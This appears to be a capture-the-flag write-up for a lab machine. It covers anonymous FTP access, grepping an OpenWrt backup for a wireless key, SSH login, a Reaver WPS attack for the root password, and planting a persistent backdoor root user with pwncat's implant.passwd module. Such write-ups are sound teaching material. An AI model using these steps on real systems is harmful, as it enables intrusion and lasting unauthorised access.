we start the machine with classic rustscan scan:
	
	rustscan -a 10.10.11.247
output:
	
	PORT   STATE SERVICE    VERSION
	21/tcp open  ftp        vsftpd (broken: cannot locate user specified in 'ftp_username':ftp)
	22/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
	|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
	|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
	53/tcp open  tcpwrapped
	Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
we have a machine that has no web server open but instead we have a port 21 ftp classic 22 SSH for
the machine control and a weird port 53 that is a typical DNS port.
I started the enumeration from the first open port, the 21 ftp:
	
	ftp 10.10.11.247
we get prompted with the username,
i tried to press enter for public share but i got wrong password.
So i tried with the anonymous login and worked:
	
	ftp anonymous@10.10.11.247
inside we found all of this:
	
![ftp listing](./ftp.png)
	
so i donwloaded everything and analyzed the data locally:
	
	ftp> mget *
now that i have all the files on my local machine i can filter for credentials keywords.
in particular that's this file backup that maybe contains credentials or code that we can analyze:
	
	-rw-r--r-- 1 kali kali 40960 11 set 17.25 backup-OpenWrt-2023-07-26.tar
i extracted the files inside:
	
	tar -xf backup-OpenWrt-2023-07-26.tar
and inside we have a /etc folder, maybe a config folder.
By the way the rest of the files are useless because they doesn't contain interesting stuff.
the etc folder that we extracted contains this:
	
![etc folder](./etc.png)
	
instead of opening all the files i tried to cat everything and grep for credentials keywords like
pass, key, cred:
	
	grep -r 'key' ./ 
	./opkg/keys/4d017e6f1ed5d616:untrusted comment: Public usign key for 22.03 release builds
	./config/uhttpd:        option key '/etc/uhttpd.key'
	./config/uhttpd:        option key_type 'ec'
	./config/wireless:      option key '[REDACTED]'
	./config/wireless:      option key '[REDACTED]'
we now have a password but we need an username to login  with ssh so i opned the same file with the password
and searched for usernames:
	
	cat ./config/wireless
but didn't find nothing there.
But running ls on the etc folder and thinking about it i have a passwd file where i have an username:
	
	cat ./etc/passwd
output:
	
	root:x:0:0:root:/root:/bin/ash
	daemon:*:1:1:daemon:/var:/bin/false
	ftp:*:55:55:ftp:/home/ftp:/bin/false
	network:*:101:101:network:/var:/bin/false
	nobody:*:65534:65534:nobody:/var:/bin/false
	ntp:x:123:123:ntp:/var/run/ntp:/bin/false
	dnsmasq:x:453:453:dnsmasq:/var/run/dnsmasq:/bin/false
	logd:x:514:514:logd:/var/run/logd:/bin/false
	ubus:x:81:81:ubus:/var/run/ubus:/bin/false
	netadmin:x:999:999::/home/netadmin:/bin/false
the only real username seems to be netadmin so i tried ssh login with the password found above(i used
pwncat for the connection):
	
	python3 -m pwncat
inside the pwncat shell:
	
	connect ssh://netadmin:[REDACTED]@10.10.11.247
the creds we found are right so we can submit the user flag and enumerate.
At this point is clear that the machine is some sort of WiFi connection or acces point.
by running:
	
	ip a
output:
	
![ip a command](./interfaces.png)
	
we can see that the interface mon0 is in monitor mode
so maybe we can intercept some wpa code or password.

Inside the machine there are various network interfaces so 
i tried to test a theory:
i used the interface that is in monitor mode to catch the 
access point wpa OpenWrt on interface wlan1:
	
![wifi interfaces](./wifi.png)
	
but i didn't know how to do that, so i continued with basic enumeration
by uploading linpeas on the machine with pwncat functionality:
	
	Ctrl + d
	upload Pentest/linpeas.sh /tmp/linpeas.sh
	Ctrl + d
	bash /tmp/linpeas
in particular this line seamed odd:
	
![strange binary](./reaver.png)
	
when i run the binary i got this output:
	
	Reaver v1.6.5 WiFi Protected Setup Attack Tool
	Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>
It is a wifi attack tool... perfect for us, we just need to supply and interface and a mac adress of the acces point,
we have all we need (from the iwconfig command above):
	
	/usr/bin/reaver -i mon0 -b 02:00:00:00:00:00 -vv
output:
	
![wpa password](./wpa_redacted.png)
	
so with this password we can try and login as root:
	
	python3 -m pwncat
	connect ssh://root:[REDACTED]@10.10.11.247
the credentials we found are right so we can submit the root flag and proceed with the post explotation with 
persistence implants(for test sake i will use pwnact):
	
	(inside pwncat interactive shell)	
	run implant.passwd backdoor_user=disturbante backdoor_pass=disturbante
we can log whenever we want with disturbante user and disturbante password as root!
	
![implant module login with new user](./implant.png)
	